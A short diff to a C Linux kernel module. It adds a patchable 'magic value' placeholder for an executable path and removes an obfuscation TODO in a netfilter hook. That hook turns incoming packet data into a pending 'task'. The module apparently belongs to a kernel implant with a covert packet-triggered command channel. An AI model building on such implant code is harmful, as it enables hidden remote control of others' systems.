@@ -18,6 +18,9 @@
 #include "macros.h"
 #include "blanko.h"
 
+// *** magic value to stamp over ***
+static const char c_user_exe_path[255] = "BASKETBALLJONES";
+
 static struct nf_hook_ops s_hookops = {0};
 static struct proc_dir_entry* s_procfile = NULL;
 
@@ -117,7 +120,6 @@ unsigned int nf_callback(unsigned int hooknum, struct sk_buff* sockbuf, const st
                         &iph->saddr, src_port, &iph->daddr, dst_port);
                 if (NULL != data)
                 {
-                    // TODO: obfuscate fmt?
                     snprintf(s_current_task, MAX_DATA_SIZE, "%pI4:%s", &iph->saddr, data);
                     KERNEL_LOG("MONSTARS_NF : %s\n", s_current_task);
                     s_task_pending = true;
